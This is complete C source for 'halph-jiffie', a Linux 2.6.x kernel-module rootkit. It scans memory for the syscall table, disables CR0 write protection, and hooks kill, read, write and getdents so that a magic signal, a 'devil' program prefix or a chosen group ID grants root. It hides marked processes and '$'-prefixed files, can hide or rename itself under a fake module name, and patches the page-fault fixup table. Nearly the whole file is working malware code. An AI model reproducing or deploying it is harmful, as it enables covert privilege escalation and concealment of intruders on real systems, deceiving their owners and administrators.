/*                                            *\
  ############################################
   halph-jiffie 1.0. Kernel-space rootkit for
          linux kernel versions 2.6.x   
  ############################################
\*                                            */

#define LIC "GPL"
#define AUTHOR "DOHMATOB E. Dopgima & Jerôme CROS"
#define DESC "halph-jiffie: linux 2.6.x kernel-space rootkit"

#define __CURRENT_VERSION__ "1.0"

#ifndef __KERNEL__
#define __KERNEL__
#endif

#ifndef MODULE
#define MODULE
#endif

#ifdef MODVERSIONS
#include <linux/modversions>
#endif

#define __DEBUG__
#define __FIXUP__
#define __FAKE__

#define __cr0__

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <asm/page.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/time.h>

#include <linux/stddef.h>
#include <linux/version.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/string.h>
#include <asm/processor-flags.h>

#define __cr0_WP_bit	16 

#define __unset_jth_bit(n, j) (n & ~(0x1 << j))
#define __set_jth_bit(n, j) (n | (0x1 << j))


/*                                     *\
  -------------------------------------
  | asm snippet to write CR0 register |
  -------------------------------------
\*                                     */
static inline void __set_cr0 (unsigned long val)
{
  __asm__ volatile ("mov %0, %%cr0 \t\n"
                    : : "r" (val), "m" (__force_order));
}

/*				      *\
  ------------------------------------
  | asm snippet to read CR0 register |
  ------------------------------------
\*			              */
static inline unsigned long __get_cr0 (void)
{
  unsigned long res;
  __asm__ volatile ("mov %%cr0, %0 \t\n"
		    : "=r" (res), "=m" (__force_order));

  return res;
}



#define TERRE 0xc0000000 //PAGE_OFFSET
#define CIEL  0xd0000000

#define GHOST_FLAG        0x1000000
#define GHOST_SIG         23
#define EVIL_GID          2701
#define GHOST_FILE_PREFIX "$"
#define EVIL_PROG_PREFIX  "devil"
#define FAKE_MODULE_NAME "windows_sept_et_demi"

#ifdef __FIXUP__
#define __START___EX_TABLE 0xc05d02d0
#define __END___EX_TABLE   0xc05d15f8
#define __BAD_GET_USER     0xc0358f0b

unsigned long __start_ex_table;
unsigned long __end_ex_table;

/* our data structure for exception handler entries */
typedef struct ex_entry_struct
{
  struct ex_entry_struct     *next;
  unsigned long           address;
  unsigned long           insn;
  unsigned long           fixup;
} *ex_entry_t;

/* storage for 'fixup' exception handler table we'll hack */
ex_entry_t __ex_old_table;

#endif


/* base address of syscall table*/
unsigned long *__sct;


/*prototypes for syscalls we'll be hooking */
asmlinkage int (*__good_write) (unsigned int fd, const char __user *buf, size_t count);
asmlinkage int (*__good_read) (unsigned int fd, const char __user *buf, size_t count);
asmlinkage int (*__good_kill) (pid_t pid, int sig);
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 14)
asmlinkage long (*__good_getdents) (unsigned int fd, struct dirent *dirp, unsigned int count);
#else
asmlinkage long (*__good_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
#endif
asmlinkage int (*__good_execve) (const char *filename, char *const argv[], char *const envp[]);


/*---------------------*\
  |renames this module|
\*---------------------*/
#define  __rename(new_name) strncpy ((&__this_module)->name, new_name, strlen((&__this_module)->name))


/*---------------------------------------------------------------*\
  |makes module invisible to lmod, cat /proc/modules, rmmod, etc|
\*---------------------------------------------------------------*/
#define __hide_myself() list_del_init (&__this_module.list)


/*---------------------------------*\
  |locates base address of the sct|
\*---------------------------------*/
unsigned long *__get_sct (void)
{
  unsigned long ptr, step = sizeof(void *);

  for (ptr = (unsigned long)TERRE; ptr < (unsigned long)CIEL; ptr += step)
 {
   unsigned long *p;
   p = (unsigned long *)ptr;
   if (p[__NR_close] == (unsigned long) sys_close)
       return p;
 }
  return 0;
}

/*----------------------------------------------------*\
  |unchecks hardware cr0 write-protection (WP) on cpu|
\*----------------------------------------------------*/
#define __handle_cr0_WP()  write_cr0 (__unset_jth_bit (read_cr0 (), __cr0_WP_bit))


/*--------------------*\
  |restores cr0 stuff|
\*--------------------*/
#define __unhandle_cr0_WP() write_cr0 (__set_jth_bit (read_cr0 (), __cr0_WP_bit))


/*------------------------------------------*\
  |determines whether given task is a ghost|
\*------------------------------------------*/
#define __task_is_ghostly(task) (task->flags & GHOST_FLAG)

#if LINUX_VERSION_CODE < KERNEL_VERSION (2, 6, 29)
#define __task_is_evil(task) (task->gid == EVIL_GID)
#else
#define __task_is_evil(task)			\
  ({						\
    struct cred *c = __task_cred (task);	\
    c->gid == EVIL_GID;				\
  })
#endif


/*------------------------------------------*\
  |determines whether given file is a ghost|
\*------------------------------------------*/
#define __file_is_ghostly(filename) strstr (filename, GHOST_FILE_PREFIX)

 
/*---------------------------------*\
  |determines whether prog is evil|
\*---------------------------------*/
#define __prog_is_evil(prog) strstr(prog, EVIL_PROG_PREFIX) 


/*---------------------------------------*\
  |changes current task's credentials to|
  |root and then makes it evil everafter|
\*---------------------------------------*/
void __nirvana (void)
{
  current->flags |= GHOST_FLAG; /* henceforth, task is ghostly */ 
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29) 
  /*here, creds were exported &  directly 
    rewritable in struct task_struct .. */ 
  current->uid = current->gid = 0;					
  current->euid = current->egid = 0;					
  current->suid = current->sgid = EVIL_GID;				
  current->fsuid = current->fsgid = EVIL_GID;				
  
#else							
  /* here, creds are no longer exported in struct
     task_struct; we can't overrite cred fields .. */
  struct cred* new = prepare_creds (); /* clone current task's creds */	
  if(new)								
    {									
      /* root stuff */							
      new->uid = new->gid = 0;						
      new->euid = new->egid = 0;					 
      new->suid = new->sgid = EVIL_GID;					 
      new->fsuid = new->fsgid = EVIL_GID;					
      commit_creds(new); /* commit changes */				
    }									
  
#endif
}						
  
/*---------------------------*\
  |evil wrapper for sys_kill|
\*---------------------------*/
asmlinkage int __evil_kill (pid_t pid, int sig)
{
  
  if (!((sig == GHOST_SIG) || __task_is_ghostly (current) || __task_is_evil (current)))
    {
      return(*__good_kill) (pid, sig);
    }
  else
    {
      __nirvana ();
      return 0;
    }
}


/*----------------------------*\
  |evil wrapper for sys_write|
\*----------------------------*/
asmlinkage int __evil_write (unsigned int fd, const char __user *buf, size_t count)
{
#ifdef __DEBUG__
    printk(KERN_ALERT "sys_write HACKED!");
#endif
    return (*__good_write) (fd, buf, count);
}

/*---------------------------*\
  |evil wrapper for sys_read|
\*---------------------------*/
asmlinkage int __evil_read (unsigned int fd, const char __user *buf, size_t count)
{
#ifdef __DEBUG__
  printk (KERN_ALERT "sys_read HACKED!");
#endif
  return (*__good_read) (fd, buf, count);
}


#if LINUX_VERSION_CODE < KERNEL_VERSION (2, 6, 14)
/*---------------------------------*		\
  |evil wrapper for sys_getdents|
  \*---------------------------------*/
asmlinkage long __evil_getdents (unsigned int fd, struct dirent *dirp, unsigned int count)
{
  struct dirent *stuff = NULL;
  struct inode *proc_node;
  char *complete = NULL;
  char *modified = NULL;
  char *ptr;
  int ret;
  int modified_ret;
  short int hide_proc;

  /* first call __good_getdents64; in case of error,
     just quit for good .. */
  if((ret = (*__good_getdents) (fd, dirp, count)) <= 0)
    return ret;

  proc_node = current->files->fd[fd]->f_dentry->d_inode;

  /* be nice to our people */
  if(__task_is_ghostly (current) || __task_is_evil (current))
    return ret;

  /* make space for high-priority kernel buffers .. */
  complete = kmalloc (ret, GFP_KERNEL);
  modified = kmalloc (ret, GFP_KERNEL);

 /* sanity */
  if (complete == NULL || modified == NULL)
    {
      printk(KERN_ALERT "kmalloc failed while hacking sys_getdents\n");

      return ret;
    }

  /* 'download' contents of dirp from user-space */
  if (__copy_from_user (complete, dirp, ret))
    /* some data could not be 'downlaoded'
       from user-space; quietly  quit */
      return ret;


  ptr = complete;
  modified_ret = 0;
  while (ret > 0)
    {
      stuff = (struct dirent*)ptr; /* fetch directory entry */
      ptr += stuff->d_reclen;
      hide_proc = 0;
      if (proc_node->i_ino == PROC_ROOT_INO)
        {
          struct task_struct *htask = current;
          for_each_process (htask)
          {
            if (htask->pid == simple_strtoul (stuff->d_name, NULL, 10))
              {
                if (__task_is_ghostly (htask) || __task_is_evil (htask))
                  hide_proc = 1;

                break;
              }
          }
        }
      /* copy everything except 'ghost' files/progs */
      if (!(hide_proc || __file_is_ghostly (stuff->d_name)))
        {
          memcpy (modified + modified_ret, stuff, stuff->d_reclen);
          modified_ret += stuff->d_reclen;
        }
      ret -= stuff->d_reclen;
    }

  /* 'upload' contents of dirp into user-space */
  if (__copy_to_user (dirp, modified, modified_ret))
    /* some data failed to be 'uploaded'
       into user-space; quietly quit .. */
    return ret;

  /* sanity */
  kfree (complete);
  kfree (modified);

  return modified_ret;
}

#else
/*---------------------------------*\
  |evil wrapper for sys_getdents64|
\*---------------------------------*/
asmlinkage long __evil_getdents64 (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
  struct linux_dirent64 *stuff = NULL;
  struct inode *proc_node;
  char *complete = NULL;
  char *modified = NULL;
  char *ptr;
  int ret;
  int modified_ret;
  short int hide_proc;
  
  /* first call __good_getdents64; in case of error,
     just quit for good .. */
  if ((ret = (*__good_getdents64) (fd, dirp, count)) <= 0)
      return ret;
  
  proc_node = current->files->fdt->fd[fd]->f_dentry->d_inode;

  /* be nice to our people */
  if (__task_is_ghostly (current))
      return ret;
  
  /* make space for high-priority kernel buffers .. */
  complete = kmalloc (ret, GFP_KERNEL);
  modified = kmalloc (ret, GFP_KERNEL);

  /* sanity */
  if (complete == NULL || modified == NULL)
    {
      printk(KERN_ALERT "kmalloc failed while hacking sys_getdents\n");

      return ret;
    }
  
  /* 'download' contents of dirp from user-space */
  if (__copy_from_user (complete, dirp, ret))
    {
      /* some data could not be 'downlaoded'
	 from user-space; quietly  quit */
      kfree (complete);
      kfree (modified);
      return ret;
    }
  
  ptr = complete;
  modified_ret = 0;
  while (ret > 0)
    {
      stuff = (struct linux_dirent64*)ptr; /* fetch directory entry */
      ptr += stuff->d_reclen;
      hide_proc = 0;

      if (proc_node && (proc_node->i_ino == PROC_ROOT_INO))
        {
          struct task_struct *htask = current;
          for_each_process (htask)
          {
            if (htask->pid == simple_strtoul (stuff->d_name, NULL, 10))
              {
                if (__task_is_ghostly (htask) || __task_is_evil (htask))
                  hide_proc = 1;
		
                break;
              }
          }
        }
      
      /* copy everything except 'ghosts' */
      if (!(hide_proc || __file_is_ghostly (stuff->d_name)))
        {
          memcpy (modified + modified_ret, stuff, stuff->d_reclen);
          modified_ret += stuff->d_reclen;
        }
      	ret -= stuff->d_reclen;
    }
  
  /* 'upload' contents of dirp into user-space */
  if (__copy_to_user (dirp, modified, modified_ret))
    /* some data failed to be 'uploaded'
       into user-space; quietly quit .. */
    return ret;
  
  /* sanity */
  kfree (complete);
  kfree (modified);
  
  return modified_ret;
}

#endif


/*-----------------------------*\
  |evil wrapper for sys_execve|
\*-----------------------------*/
asmlinkage int __evil_execve (const char *filename, char *const argv[], char *const envp[])
{
  if (!__prog_is_evil (filename))
    goto ret;

  __nirvana ();
  goto ret;

 ret:
  return (*__good_execve) (filename, argv, envp);
}


/*---------------------------------------------------*\
  | sets up an evil wrapper for syscall sys_##which |
\*---------------------------------------------------*/
#ifdef __cr0__
#define __hook_syscall(which)  __handle_cr0_WP ();	\
  __good_##which = (void *)__sct[__NR_##which];		\
  __sct[__NR_##which] = (unsigned long)__evil_##which;	\
  __unhandle_cr0_WP ();
#else 
#define __hook_syscall(which)__good_##which = (void *)__sct[__NR_##which];\
  __sct[__NR_##which] = (unsigned long)__evil_##which;			 
#endif

/*----------------------------------------------------*	\
  |undoes our evil wrapper around syscall sys_##which| 
\*----------------------------------------------------*/
#ifdef __cr0__
#define __unhook_syscall(which) __handle_cr0_WP ();	\
__sct[__NR_##which] = (unsigned long)__good_##which;	\
__unhandle_cr0_WP ();
#else
#define __unhook_syscall(which) __sct[__NR_##which] = (unsigned long)	\
    __good_##which;
#endif

#ifdef __FIXUP__
/*----------------------------------------------------*\
  |evil hook for 'fixup' page fault exception handler|
\*----------------------------------------------------*/
static int __hook_page_fault_exception_handler (void)
{
  unsigned long __start_ex_table = __START___EX_TABLE;
  unsigned long __end_ex_table = __END___EX_TABLE;

  unsigned long       insn = __start_ex_table;
  unsigned long       fixup; /* legimate handler we'll be redirectly */
  ex_entry_t          entry, last_entry;

  __ex_old_table = NULL;


  /* find exception handler */
  for (  ; insn < __end_ex_table; insn += 2 * sizeof (unsigned long)) 
    {
      fixup = insn + sizeof (unsigned long);
      
      if (*(unsigned long *)fixup == __BAD_GET_USER)
	{
	  /* exception handler localized */
	  
	  entry = (ex_entry_t)kmalloc (GFP_ATOMIC, sizeof (struct ex_entry_struct));
	  
	  if (!entry)
	    /* screwed */
	    return -1;
	  /* intialize entry */
	  entry->next = NULL;
	  entry->address = insn;
	  entry->insn = *(unsigned long *)insn;
	  entry->fixup = *(unsigned long *)fixup;
	  
	  if (__ex_old_table) 
	    {
	      last_entry = __ex_old_table;
	      
	      /* take entry to borders */
	      while (last_entry->next != NULL)
		last_entry = last_entry->next;
	      
	      last_entry->next = entry;
	    } else
	    __ex_old_table = entry;
	  
	  /* start hook-up */
#ifdef __cr0__
	  __handle_cr0_WP ();
#endif
	  *(unsigned long *)fixup = (unsigned long)__nirvana;
#ifdef __cr0__
	  __unhandle_cr0_WP ();
#endif
	  /* end hook-up */
      }
    }
  return 0;
}


/*------------------------*			\
  |unhooks the hook above|
  \*------------------------*/
static void __unhook_page_fault_exception_handler (void)
{
  ex_entry_t     entry = __ex_old_table;
  ex_entry_t     tmp;
  
  if (!entry)
    return;
  
  /* restore legitimate handler; remember in module_init, we mouved
     the corresponding entry to the borders of the exception handler table */
  while (entry)
    {
#ifdef __cr0__
      __handle_cr0_WP ();
#endif
      *(unsigned long *)entry->address = entry->insn;
      *(unsigned long *)((entry->address) + sizeof (unsigned long)) = entry->fixup;
#ifdef __cr0__
      __unhandle_cr0_WP ();
#endif
      tmp = entry->next;
      kfree (entry);
      entry = tmp;
    }
}
#endif

/*------------------------------------------------*\
  |injects this module into kernel-space, thereby|
  | hooking up target syscalls and other goodies |
\*------------------------------------------------*/
static int __init inject (void)
{
#ifndef __cr0__
  __handle_cr0_WP ();
#endif

#ifdef __DEBUG__
  printk (KERN_ALERT "\ninjecting halph-jiffie %s into kernel-space ..\n", __CURRENT_VERSION__);
#endif
  
#ifdef __HIDE__
  __hide_myself ();
#endif
  
#ifdef __FAKE__
  __rename (FAKE_MODULE_NAME);
#endif
  
  if (!( __sct = __get_sct ()))
    {
#ifdef __DEBUG__
      printk (KERN_ALERT "sorry! could not locate SCT!\n");
#endif
      goto quit;
    }
  
#ifdef __FIXUP__
  __hook_page_fault_exception_handler ();
#endif
  
   __hook_syscall (write);
   __hook_syscall (read);
   __hook_syscall (kill);

#if LINUX_VERSION_CODE < KERNEL_VERSION (2, 6, 14)
   __hook_syscall (getdents);
#else
   __hook_syscall (getdents64);
#endif

   goto quit;
   
 quit:
   return 0;
}

/*----------------------------------------------*\	
  |ejects this module from kernel-space thereby|
  | unhooking all hooked calls and other stuff |
\*----------------------------------------------*/
static void __exit eject (void)
{

#ifdef __DEBUG__
  printk(KERN_ALERT "ejecting kiriou %s out of kernel-space ..\n", __CURRENT_VERSION__);
#endif

  if (!__sct)
    goto quit;
  
#ifdef __FIXUP__
  __unhook_page_fault_exception_handler ();
#endif
  __unhook_syscall (write);
  __unhook_syscall (read);
  __unhook_syscall (kill);

#if LINUX_VERSION_CODE < KERNEL_VERSION (2, 6, 14)
  __unhook_syscall (getdents);
#else
  __unhook_syscall (getdents64);
#endif

  goto quit;
  
 quit:
#ifdef __DEBUG__
  printk (KERN_ALERT "\nDONE!\n");
#endif
#ifndef __cr0__
  __unhandle_cr0_WP ();
#endif
}

module_init (inject);
module_exit (eject);

/* doc */
MODULE_LICENSE (LIC);
MODULE_AUTHOR (AUTHOR);
MODULE_DESCRIPTION (DESC); 
